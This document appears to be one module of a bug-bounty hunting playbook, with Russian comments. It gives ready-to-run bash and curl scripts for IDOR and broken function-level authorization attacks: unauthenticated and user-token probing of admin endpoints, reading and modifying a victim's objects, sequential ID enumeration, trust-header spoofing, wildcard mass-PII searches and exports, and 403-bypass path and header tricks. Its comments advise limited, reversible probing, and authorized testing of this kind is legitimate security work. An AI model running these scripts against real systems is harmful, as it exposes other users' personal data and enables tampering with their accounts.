# M2_IDOR_BFLA — IDOR + Broken Function Level Authorization
# Trigger: found user_id / object_id / object list
# Needs: MY_TOKEN (user_A) · VICTIM_ID (user_B) · TARGET

MY_TOKEN="TOKEN_A"
VICTIM_ID="ID_VICTIM"
TARGET="https://TARGET"

# CONTROL (иначе false-positive): по каждому хиту сравни 3 ответа —
#  (1) без токена  (2) свой own-id  (3) victim-id. IDOR = данные жертвы приходят по MY_TOKEN
#  и отличаются от своих; одинаковый публичный ответ всем = не баг, не репортить.

## [A1] Direct access without auth — 30 seconds

for ep in api/users api/members api/accounts api/students api/staff \
           api/admin/users api/internal/users api/system/users; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET/$ep")
  echo "$ep → $STATUS"
  [ "$STATUS" = "200" ] && curl -sk "$TARGET/$ep" | python3 -m json.tool | head -20 && \
    echo "[P0] unauth-access | /$ep | other's data without token"
done

## [A2] Admin endpoints with user token → BFLA

for ep in api/admin/users api/admin/export api/admin/stats api/admin/logs \
           api/admin/config api/admin/audit api/staff/users api/internal/users \
           api/system/users api/management/users api/superadmin api/operator; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    "$TARGET/$ep" -H "Authorization: Bearer $MY_TOKEN")
  echo "$ep → $STATUS"
  [ "$STATUS" = "200" ] && \
    curl -sk "$TARGET/$ep" -H "Authorization: Bearer $MY_TOKEN" | head -30 && \
    echo "[P0] BFLA | /$ep | admin function with user token"
done

## [A3] IDOR Read — object matrix

# ВНИМАНИЕ: $VICTIM_ID — это user_id. Для documents/payments/invoices нужны ИХ object_id
#          (id объекта != id пользователя) — подставляй реальные id жертвы по каждому типу.
for obj in profile documents files uploads certificates payments orders invoices \
           subscriptions messages notifications activity progress grades enrollments \
           results sessions tickets chats contacts tasks reports billing; do
  RESP=$(curl -sk "$TARGET/api/$obj/$VICTIM_ID" -H "Authorization: Bearer $MY_TOKEN")
  EMAIL=$(echo "$RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('email',''))" 2>/dev/null)
  PHONE=$(echo "$RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('phone',''))" 2>/dev/null)
  [ -n "$EMAIL" ] && echo "[P0] IDOR-read | /api/$obj/$VICTIM_ID | email=$EMAIL"
  [ -n "$PHONE" ] && echo "[P0] IDOR-read | /api/$obj/$VICTIM_ID | phone=$PHONE"
  # NB: объекты без email/phone (файлы, платежи, СНИЛС/паспорт/карта) — смотреть тело вручную
done

## [A4] IDOR Write — attempt to modify other's data

# Пишем ОДНО безобидное обратимое поле (НЕ phone/email — не ломаем восстановление жертвы)
for method in PATCH PUT; do
  curl -sk -X $method "$TARGET/api/users/$VICTIM_ID" \
    -H "Authorization: Bearer $MY_TOKEN" -H "Content-Type: application/json" \
    -d '{"displayName":"idor-probe-A2B"}' -o /dev/null -w "$method → %{http_code}\n"
done
# ПОДТВЕРЖДЕНИЕ: не верить 200 / "success" в теле (частый false-positive) —
#  перечитать жертву и убедиться, что поле РЕАЛЬНО изменилось:
curl -sk "$TARGET/api/users/$VICTIM_ID" -H "Authorization: Bearer $MY_TOKEN" | \
  grep -q "idor-probe-A2B" && \
  echo "[P0] IDOR-write | PATCH/PUT /api/users/$VICTIM_ID | изменение сохранилось у жертвы"
# После подтверждения — вернуть исходное значение поля (минимальный impact, RAILS).
# DELETE: НЕ удалять чужой аккаунт — деструктив, против RAILS/scope (данные не восстановить).
#  Только безопасная проба метода (не исполняет удаление):
curl -sk -X OPTIONS "$TARGET/api/users/$VICTIM_ID" \
  -H "Authorization: Bearer $MY_TOKEN" -D - -o /dev/null | grep -i "^allow:"
# Реальный DELETE-IDOR подтверждать на СВОЁМ втором тестовом объекте, не на жертве.

## [A5] Sequential enum — neighboring IDs

# Только числовые id. UUID/ULID/хэш → арифметика бессмысленна, пропусти (используй A3/A6).
MY_ID=$(curl -sk "$TARGET/api/profile" -H "Authorization: Bearer $MY_TOKEN" | \
  python3 -c "import sys,json; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)

for delta in -10 -5 -3 -2 -1 1 2 3 5 10 50 100 1000; do
  [ -z "$MY_ID" ] && break
  TID=$((MY_ID + delta))
  RESP=$(curl -sk "$TARGET/api/users/$TID" -H "Authorization: Bearer $MY_TOKEN")
  EMAIL=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('email',''))" 2>/dev/null)
  [ -n "$EMAIL" ] && echo "[P0] IDOR-enum | /api/users/$TID | email=$EMAIL"
done

## [A6] Indirect IDOR — via request body

curl -sk -X POST "$TARGET/api/profile/view" \
  -H "Authorization: Bearer $MY_TOKEN" -H "Content-Type: application/json" \
  -d "{\"user_id\": \"$VICTIM_ID\"}" | python3 -m json.tool | head -20

curl -sk -X POST "$TARGET/api/messages/list" \
  -H "Authorization: Bearer $MY_TOKEN" -H "Content-Type: application/json" \
  -d "{\"recipient_id\": \"$VICTIM_ID\"}"

## [A7] Trust headers — microservices

# Доп: часть gateway доверяет заголовку только БЕЗ Bearer — повтори и без Authorization.
for h in "X-User-Id" "X-Internal-User-Id" "X-Real-User-Id" "X-Forwarded-User" \
         "X-Admin" "X-Original-User" "X-Auth-User" "X-Remote-User"; do
  RESP=$(curl -sk "$TARGET/api/profile" \
    -H "$h: $VICTIM_ID" -H "Authorization: Bearer $MY_TOKEN")
  EMAIL=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('email',''))" 2>/dev/null)
  [ -n "$EMAIL" ] && echo "[P0] trust-header | $h: $VICTIM_ID | other's profile"
done

## [A8] Mass PII dump

# Search wildcard
for q in "@" "gmail" "a" "*" ".com" "admin" "+"; do
  COUNT=$(curl -sk --get "$TARGET/api/users/search" --data-urlencode "q=$q" \
    -H "Authorization: Bearer $MY_TOKEN" | python3 -c \
    "import sys,json; d=json.load(sys.stdin); print(len(d) if isinstance(d,list) else len(d.get('data',d.get('users',[]))))" 2>/dev/null)
  [ "$COUNT" -gt 5 ] 2>/dev/null && echo "[P0] mass-PII | /users/search?q=$q | $COUNT records"
done

# Export
for ep in users/export export/users users/download users/all admin/export \
          api/reports/users.csv api/admin/export/users; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET/$ep" \
    -H "Authorization: Bearer $MY_TOKEN")
  [ "$STATUS" = "200" ] && echo "[P0] mass-export | /$ep | HTTP 200 with user token"
done

## [A9] 403 bypass on /admin

for path in "admin" "Admin" "ADMIN" "admin/" "admin%2f" "admin%252f" \
            "admin..;/" "./admin" "admin/." "%61dmin" "admin%20"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET/$path")
  [ "$STATUS" = "200" ] && echo "[P0] 403-bypass | /$path | admin accessible"
done

for h in "X-Original-URL: /admin" "X-Rewrite-URL: /admin" \
         "X-Custom-IP-Authorization: 127.0.0.1" "X-Forwarded-For: 127.0.0.1"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET/admin" -H "$h")
  [ "$STATUS" = "200" ] && echo "[P0] header-bypass | $h | admin accessible"
done

## [A10] HTTP Method matrix on critical endpoints

# На ЖЕРТВЕ — только безопасные методы (PUT/PATCH/DELETE реально изменят/удалят её объект!)
for method in GET HEAD OPTIONS; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X $method "$TARGET/api/users/$VICTIM_ID" \
    -H "Authorization: Bearer $MY_TOKEN")
  echo "$method /api/users/$VICTIM_ID → $STATUS"
done
# OPTIONS/Allow покажет разрешённые методы без исполнения. Write/DELETE-матрицу гонять
# ТОЛЬКО по своему тестовому объекту (api/users/$MY_ID), затем подтверждать как A4.

## TRIGGERS

→ Found JWT in response / login → Read "C:\HUNT CORE SYSTEM\M3_AUTH_BYPASS.md"
→ Found /export with other's data → M3 ATO-chain
→ 500 on PATCH/PUT → Read "C:\HUNT CORE SYSTEM\M4_INJECT.md" [I1] SQLi
